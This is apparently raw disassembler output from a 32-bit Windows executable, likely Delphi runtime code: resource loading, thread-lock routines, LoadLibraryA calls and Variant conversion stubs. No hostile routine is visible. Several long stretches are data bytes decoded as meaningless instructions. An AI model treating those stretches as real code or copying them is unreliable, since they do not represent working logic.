mov eax [ eax ]
push eax
call FindResourceA
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadResource
mov edi eax
jmp r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebx
push 0xa
push r-xdata
mov ebp [ esi + 0x4 ]
push ebp
call FindResourceA
push eax
push ebp
call LoadResource
mov edi eax
test edi edi
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_40f41c
push ebx
push esi
push edi
push ebp
push ecx
call sub_40f3a4
mov ebx eax
test ebx ebx
je r-xdata
mov ebp [ rw-data ]
mov edi ebx
mov eax edi
call sub_40f364
mov esi eax
mov eax edi
call sub_40f374
mov ebp esi
mov edx rw-data
mov edi rw-data
cmp esi [ edx ]
jne r-xdata
cmp esi [ edx + 0x4 ]
jne r-xdata
cmp eax [ edi ]
je r-xdata
cmp esi [ edx + 0x8 ]
jne r-xdata
cmp eax [ edi + 0x4 ]
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
call sub_40f38c
jmp r-xdata
mov [ esp ] al
push ebx
call FreeResource
cmp [ esp ] 0x0
jne r-xdata
sub_40f4ac
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_40a748
mov [ rw-data ] eax
sub_40f530
push ebx
push esi
push edi
push ebp
push ecx
call sub_404a1c
mov [ esp ] dl
mov ebp eax
xor edi edi
inc edi
cmp edi 0x10
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax esi
call sub_402f1c
test ebx ebx
jne r-xdata
mov ebx [ ebp + edi * 4 + 0x4 ]
xor eax eax
mov [ ebp + edi * 4 + 0x4 ] eax
test ebx ebx
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_404640
cmp [ esp ] 0x0
jle r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4049c4
sub_40f5a4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40f588
mov ebx eax
call GetCurrentThreadId
mov esi eax
movzx eax bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40f62c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_402ee8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
movzx eax bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40f520
mov [ ebp ] eax
sub_40f62c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40f588
movzx eax al
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40f520
mov esi eax
cmp esi 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40f670
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_40f6e4
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_40f770
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_404650
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_40f770
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov bl 0x1
call GetCurrentThreadId
mov edi eax
cmp edi [ ebp + 0x24 ]
je r-xdata
inc [ ebp + 0x1c ]
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40f72c
mov eax [ ebp + 0x28 ]
mov [ esp + 0x4 ] eax
mov edx esp
mov eax [ ebp + 0x20 ]
call sub_40f5a4
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff0001
call sub_40f528
cmp eax 0xffff
jne r-xdata
lea eax [ ebp + 0xc ]
call sub_40f508
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff
call sub_40f528
mov esi eax
test esi esi
je r-xdata
mov eax ebp
call sub_40f72c
test bl bl
je r-xdata
mov eax ebp
call sub_40f760
mov [ ebp + 0x24 ] edi
lea eax [ ebp + 0x28 ]
call sub_40f508
dec eax
cmp eax [ esp + 0x4 ]
sete bl
lea eax [ ebp + 0xc ]
call sub_40f514
sub_40f81c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f5a4
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40f528
mov eax ebx
call sub_40f744
mov eax ebx
call sub_40f738
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f61c
sub_40f86c
push ebx
push esi
push edi
push ecx
mov edi eax
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40f5a4
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ edi + 0x24 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_40f750
jmp r-xdata
lea eax [ edi + 0xc ]
call sub_40f514
test eax eax
jle r-xdata
lea eax [ edi + 0xc ]
call sub_40f508
mov esi eax
cmp esi 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax edi
call sub_40f750
mov eax edi
call sub_40f744
sub_40f8dc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f5a4
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f61c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40f508
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40f744
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40f744
sub_40f954
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40f978
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f9ef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_40700c
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_404704
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9f6
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_404704
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40f954
test al al
jne r-xdata
mov al 0x1
sub_40fa10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40fa82
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40fa64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4059dc
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa6b
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40fa94
push ebx
mov ebx [ rw-data ]
mov ebx [ ebx ]
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebx + 0x14 ]
call sub_40641c
xor eax eax
mov [ ebx + 0x14 ] eax
sub_40fac4
sbb eax 0x1c000000
sbb cl [ ecx ]
cld
dec edx
dec ecx
add [ edx + ebx ] dl
dec ecx
add ah dh
dec ecx
dec ecx
add [ edx + ebx ] cl
dec ecx
add [ eax + ecx * 2 ] cl
dec ecx
add [ edx + ebx ] al
dec ecx
add [ ebx + ecx * 2 + 0x49 ] ah
add ah bh
sbb [ ecx ] ecx
mov al 0x4b
dec ecx
add ah dh
sbb [ ecx ] ecx
loopne r-xdata
dec ecx
add [ ecx + ebx + 0x4ad80049 ] ah
dec ecx
add [ ecx + ebx + 0x4ab00049 ] bl
dec ecx
add [ ecx + ebx + 0x4d040049 ] dl
dec ecx
add [ ecx + ebx + 0x4c9c0049 ] cl
dec ecx
add [ ecx + ebx + 0x49bc0049 ] al
dec ecx
add [ ecx + ebx + 0x49 ] bh
add [ esp + ecx * 2 + 0x49 ] bl
add [ ecx + ebx + 0x49 ] dh
add [ eax + 0x4c ] dh
dec ecx
add [ ecx + ebx + 0x49 ] ch
add al cl
dec eax
dec ecx
add [ ecx + ebx + 0x49 ] ah
add [ eax + 0x48 ] dh
dec ecx
add [ ecx + ebx + 0x49 ] bl
add [ edx + ecx * 2 + 0x19540049 ] ch
dec ecx
add [ ebx + ecx * 2 + 0x49 ] bl
add [ ecx + ebx + 0x49 ] cl
add ah cl
inc edi
dec ecx
add [ ecx + ebx + 0x49 ] al
add [ esp + ecx * 2 + 0x49 ] cl
add [ ecx + ebx ] bh
dec ecx
add [ eax + 0x28004949 ] bh
add [ eax ] al
add [ ecx + ebx ] dh
dec ecx
add [ eax ] ch
dec esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb [ ecx ] ecx
sbb [ eax + 0x49 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] ch
dec ecx
add [ ebx + ecx * 2 + 0x49 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sbb [ ecx ] ecx
fadd [ edi + 0x49 ]
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] ah
dec ecx
add [ eax + ecx * 2 + 0x49 ] dl
add [ eax ] al
and [ ecx ] bl
dec ecx
add [ eax + ecx * 2 + 0x49 ] cl
add [ eax ] al
sbb al 0x19
dec ecx
add [ eax ] ch
dec eax
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sbb [ ecx ] ecx
mov ah 0x49
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] dl
dec ecx
add ah dl
dec edx
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sbb [ ecx ] ecx
nop
dec eax
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] cl
dec ecx
add [ edx + ecx * 2 + 0x49 ] ah
add [ eax ] al
or [ ecx ] bl
dec ecx
add [ ebx + ecx * 2 + 0x49 ] ah
add [ eax ] al
add al 0x19
dec ecx
add [ eax + 0x494b ] dl
add [ eax ] al
add [ eax ] al
sbb [ ecx ] ecx
hlt
dec ecx
add ah ch
sbb [ ecx ] ecx
ror [ ecx + 0x49 ] 0x1
add ah ah
sbb [ ecx ] ecx
mov esp 0xdc004947
sbb [ ecx ] ecx
xor al 0x4a
dec ecx
add ah dl
sbb [ ecx ] ecx
cwde
dec edx
dec ecx
add ah cl
sbb [ ecx ] ecx
mov al [ 0xffffffffc4004949 ]
sbb [ ecx ] ecx
test al 0x49
dec ecx
add [ ecx + ebx + 0x4c500049 ] bh
dec ecx
add [ ecx + ebx + 0x49a40049 ] dh
dec ecx
add [ ecx + ebx + 0x4cec0049 ] ch
sub_41005c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
movzx eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_4100b0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41010a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409f30
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410111
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41011c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_410176
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b7c4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41017d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_410188
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4101e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b798
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4101e9
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4101f4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41024e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40d24c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410255
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_410260
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4102ba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b7f0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102c1
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4102cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_410339
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_40a084
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410340
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_41034c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4103ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40b710
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_405ea8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103b3
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4103bc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_41041e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40c8f8
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_405ea8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410425
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_410430
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_410494
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_40a120
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_405ea8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41049b
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4104c4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_4104f0
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_41005c
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41008c
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41008c
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410098
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4100a4
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4100b0
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41011c
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410188
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4101f4
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410260
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4102cc
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41034c
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4103bc
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410430
mov eax r-xdata
call sub_4104c4
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_4107fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410821
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410828
retn
sub_41094c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
or [ ecx ] eax
or al 0x0
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ eax - 0x17ffbfb8 ] ah
outsb
jbe r-xdata
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
or al [ ecx ]
or al 0x0
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xb
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
outsd
jb r-xdata
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ edx ] 0x41
add [ eax + eax ] cl
outsd
jb r-xdata
ror [ edx ] 0x41
inc ebx
popad
jb r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
clc
or [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x72615645
jns r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x17ffbfb8 ] ah
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol al 0xa
inc ecx
rcr [ edx + ecx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
or al [ ecx ]
or al 0x0
jb r-xdata
popad
outsb
je r-xdata
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
test al 0x48
inc eax
add [ eax + 0x46 ] al
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc ecx
jb r-xdata
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x41 ] bl
add [ eax + eax ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
or [ ecx ] eax
or al 0x0
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
add [ eax ] al
lea eax [ eax ]
xchg esp eax
or [ ecx ] eax
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
or al 0x41
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x6d ] ch
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
or eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax + ecx * 2 + 0x48a80040 ] ah
jb r-xdata
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
jb r-xdata
outsb
je r-xdata
popad
or eax [ ecx ]
or al 0x0
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
shr ah 0xb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
